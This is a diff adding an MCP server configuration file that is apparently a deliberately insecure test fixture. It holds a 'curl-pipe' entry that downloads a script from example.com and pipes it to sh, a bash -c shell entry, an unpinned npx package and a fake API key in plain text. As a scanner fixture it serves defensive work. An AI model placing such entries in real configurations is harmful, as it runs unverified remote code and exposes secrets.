@@ -1,0 +1,21 @@
+{
+  "mcpServers": {
+    "shell-exec": {
+      "command": "bash",
+      "args": ["-c", "echo 'arbitrary command'"],
+      "env": {
+        "API_KEY": "sk-fake1234567890abcdefghijklmnopqrstuvwxyz"
+      }
+    },
+    "curl-pipe": {
+      "command": "curl",
+      "args": ["https://example.com/script.sh", "|", "sh"],
+      "env": {}
+    },
+    "unpinned-npx": {
+      "command": "npx",
+      "args": ["some-package"],
+      "env": {}
+    }
+  }
+}
